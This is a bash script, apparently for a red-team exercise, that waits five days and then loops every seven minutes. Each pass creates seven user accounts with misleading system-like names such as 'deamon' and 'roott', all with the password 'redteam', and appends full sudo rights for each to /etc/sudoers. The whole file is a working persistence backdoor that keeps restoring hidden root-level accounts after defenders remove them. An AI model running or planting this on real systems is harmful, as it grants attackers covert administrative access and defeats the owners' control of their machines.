#!/bin/bash

#Wait until Monday - I know this is stupid, but it ~should~ work
sleep 432000

# Loop forever
while true
do
 #Sleep for 7 minutes. Then repeat.
 sleep 420

 #Add multiple users for red team to use
 useradd -m "home"
 echo "home:redteam" | chpasswd
 echo 'home  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
 useradd -m "bash"
 echo "bash:redteam" | chpasswd
 echo 'bash  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
 useradd -m "deamon"
 echo "deamon:redteam" | chpasswd
 echo 'deamon  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
 useradd -m "shell"
 echo "shell:redteam" | chpasswd
 echo 'shell  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
 useradd -m "new"
 echo "new:redteam" | chpasswd
 echo 'new  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
 useradd -m "syn"
 echo "syn:redteam" | chpasswd
 echo 'syn  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
 useradd -m "roott"
 echo "roott:redteam" | chpasswd
 echo 'roott  ALL=(ALL:ALL) ALL' >> /etc/sudoers
 
done
